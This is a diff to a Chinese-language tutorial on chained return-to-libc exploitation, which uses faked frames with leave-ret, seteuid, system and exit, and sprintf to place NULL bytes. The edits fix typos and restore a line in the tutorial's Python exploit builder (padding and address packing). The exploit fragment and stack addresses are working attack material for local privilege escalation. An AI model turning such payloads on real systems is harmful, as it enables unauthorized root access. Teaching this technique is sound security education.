@@ -92,12 +92,12 @@ seteuid: 现在EIP又重新指向text地址0x0804851c(“leave ret”). 在执�
 * ‘leave’修改了下面的寄存器
  	- esp = ebp = 0xbffff204
  	- ebp = 0xbffff214, esp =0xbffff208
-* ‘ret’执行seteuis()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）
+* ‘ret’执行seteuid()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）
 * 调用seteuid()后，”leave ret”指令(位于栈地址0xbffff20c处)开始执行
 
 可以从上面的栈布局看出，执行上述过程，栈已经按照攻击者的意图设置好，system和exit函数都能得到执行。  
 
-问题2: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcp函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。  
+问题2: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcpy函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。  
 
 注意: 但不幸地是我的libc.so.6中strcpy函数的地址是0xb7ea6200。 libc函数地址本身包含一个NULL字节(不好的字符!)。 因此，strcpy不能成功地利用漏洞代码。sprintf（函数地址是0xb7e6e8d0)可以用来替代strcpy。使用sprintf时，NULL字节被拷贝到seteuid_arg在栈中的位置。  
 
@@ -131,7 +131,8 @@ system_arg = 0x804829d
 exit_arg = 0xffffffff
 #endianess convertion
 def conv(num):
- return struct.pack("<I",num* 264 
+ return struct.pack("<I",num)
+buf = "A"*264  
 buf += conv(fake_ebp0) 
 buf += conv(leave_ret) 
 #Below four stack frames are for sprintf (to setup seteuid arg )
